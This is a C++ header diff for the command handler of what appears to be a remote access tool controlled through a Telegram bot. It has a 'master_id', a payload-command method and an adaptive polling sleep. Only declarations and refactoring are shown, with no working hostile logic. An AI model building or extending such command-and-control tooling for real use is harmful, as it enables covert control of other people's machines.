@@ -15,13 +15,15 @@
 
 namespace rat::handler {
 
-using ThreadPool_uPtr = std::unique_ptr<::rat::ThreadPool>;
+using ThreadPool_uPtr = std::unique_ptr<::rat::threading::ThreadPool>;
 using BaseBot_uPtr = std::unique_ptr<::rat::tbot::BaseBot>;
 using Bot_uPtr = std::unique_ptr<::rat::tbot::Bot>;
 using CurlClient_uPtr = std::unique_ptr<::rat::networking::Client>;
 
 class Handler {
 public:
+    std::atomic<uint32_t> sleep_timeout_ms{500};
+    uint32_t empty_updates_count = 0;
     uint64_t master_id;
     Bot_uPtr bot;
     BaseBot_uPtr backing_bot;
@@ -39,7 +41,7 @@ private:
     ::rat::handler::RatState state; //this is a refrence to a stack object;
     /*since now we have a backing bot we can use its curl_client*/ 
 
-    ::rat::tbot::Update telegram_update;
+    ::rat::tbot::Update* telegram_update;
     Command command;
 
     struct CommandHandler {
@@ -102,11 +104,12 @@ private:
     void dispatchDynamicCommand();
 
     void handlePayloadCommand(void);
+    void _dynamicSleep();
     
 public:
     explicit Handler() {
         this->state = {}; 
-        this->telegram_update = {};
+        this->telegram_update = nullptr;
         this->command = {};
     };
     ~Handler() {};
@@ -116,7 +119,8 @@ public:
     void initCurlClient(uint8_t Operation_Restart_Bound = 5);
     void initThreadPools(uint8_t Number_Process_Threads = 1, uint8_t Number_Timer_Threads = 2);
     // Handle Telegram update
-    void handleUpdate(rat::tbot::Update&& arg_Update);
+    
+    void handleUpdates();
      
 };//class rat::handler::Handler
 
